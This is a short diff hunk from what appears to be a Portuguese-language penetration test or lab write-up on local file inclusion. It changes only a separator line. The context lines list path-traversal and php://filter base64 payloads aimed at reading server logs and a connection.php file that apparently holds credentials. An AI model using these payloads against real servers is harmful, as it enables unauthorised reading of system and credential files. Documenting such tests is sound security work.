@@ -255,7 +255,7 @@ Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
 								 /var/log/httpd/access_log
 								 /var/log/mysqld.log
 								 /var/log/httpd/error_log
-								 ________________________________________
+
 							 	 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access_log
 							 	 php://filter/read=convert.base64-encode/resource=connection.php
 								 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access.log	
